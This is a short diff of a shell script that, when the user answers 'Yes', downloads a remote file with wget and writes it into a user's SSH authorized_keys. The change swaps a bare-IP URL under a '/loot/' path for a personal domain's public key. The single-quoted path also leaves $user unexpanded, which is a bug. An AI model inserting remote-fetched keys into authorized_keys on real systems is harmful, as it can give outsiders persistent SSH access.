@@ -70,7 +70,7 @@ do
 		 "Yes")
 		  mkdir -p /home/$user/.ssh/
 		  touch /home/$user/.ssh/authorized_keys
-		  wget -qO - http://128.39.147.88:8080/loot/d91a2948-b569-4873-9881-34a0fd9f0c3a.txt > '/home/$user/.ssh/authorized_keys'
+		  wget -qO - http://datapor.no/public/skandix_pub > '/home/$user/.ssh/authorized_keys'
 		  ;;
 		  "No")
 		  break
